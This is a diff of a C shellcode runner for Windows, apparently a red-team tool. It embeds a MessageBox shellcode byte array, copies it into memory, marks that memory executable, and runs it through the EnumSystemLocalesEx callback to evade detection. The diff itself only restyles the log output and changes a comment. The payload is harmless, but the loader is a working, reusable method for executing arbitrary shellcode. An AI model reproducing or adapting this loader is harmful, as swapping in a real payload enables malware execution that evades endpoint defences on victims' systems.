@@ -3,7 +3,7 @@
 #include <stdlib.h>
 
 // MessageBox shellcode - 64-bit (exitfunc = thread)
-// ^ - >> Hi from Red Team Operator ! <<
+// ^ - >> Hello World ! <<
 unsigned char shellcode[] =
 "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
 "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
@@ -48,52 +48,51 @@ int main()
 
     vAlloc = VirtualAlloc(0, scSize, MEM_COMMIT, PAGE_READWRITE);
     if (!vAlloc) {
-        printf("VirtualAlloc Failed ! -> %d\n", GetLastError());
+        printf("VirtualAlloc Failed ->          [ %d ]\n", GetLastError());
         return -2;
     }
-    printf("VirtualAlloc -> %p\n", vAlloc);
+    printf("Virtual Alloc ->            [ %p ]\n", vAlloc);
 
     // Should allocate memory in the heap section 
     // 0x250 = 592 bytes
     HGLOBAL gAlloc = GlobalAlloc(GHND, scSize);
     if (!gAlloc) return -2;
-    printf("Global Alloc: %p\n", gAlloc);
+    printf("Global Alloc ->             [ %p ]\n", gAlloc);
 
     SIZE_T gSize = GlobalSize(gAlloc);
-    printf("Allocated size: %d\n", (unsigned int)gSize);
+    printf("Allocated size ->           [ %d ]\n", (unsigned int)gSize);
 
     gLock = GlobalLock(gAlloc);
     if (!gLock) {
-        printf("Global Lock failed: %d\n", GetLastError());
+        printf("Global Lock failed          [ %d ]\n", GetLastError());
         return -2;
     }
-    printf("GlobalLock Succeeded! -> %p\n", gLock);
+    printf("GlobalLock Succeeded ->     [ %p ]\n", gLock);
     
     if (memmove(gLock, shellcode, scSize)) {
         if (!memmove(vAlloc, gLock, scSize)) {
-            printf("Cant move GlobalAlloc to VirtualAlloc !\n");
+            printf("Cant move GlobalAlloc to VirtualAlloc !\nError          [ %d ]", GetLastError());
             return -2;
         }
     }
     else
     {
-        printf("Failed writing shellcode in GlobalAlloc memory !\n");
-        printf("Error: %d", GetLastError());
+        printf("Failed writing shellcode in GlobalAlloc memory !\nError         [ %d ]", GetLastError());
         return -2;
     }
-    printf("RtlMoveMemory Succeeded !\n");
+    //printf("RtlMoveMemory Succeeded !\n");
 
     DWORD oldProtect;
     vProtect = VirtualProtect(vAlloc, scSize, PAGE_EXECUTE_READ, &oldProtect);
     if (!vProtect) {
         printf("VirtualProtect Failed !\n");
         return -2;
-    } printf("VirtualProtect Succeeded !\n");
+    } //printf("VirtualProtect Succeeded !\n");
 
     BOOL exec = EnumSystemLocalesEx((LOCALE_ENUMPROCEX)vAlloc, 0, 0, NULL);
     if (exec == false)
     {
-        printf("EnumSystemLocalesW Error: %d", GetLastError());
+        printf("Callback function Error         [ %d ]", GetLastError());
         return -2;
     }
 
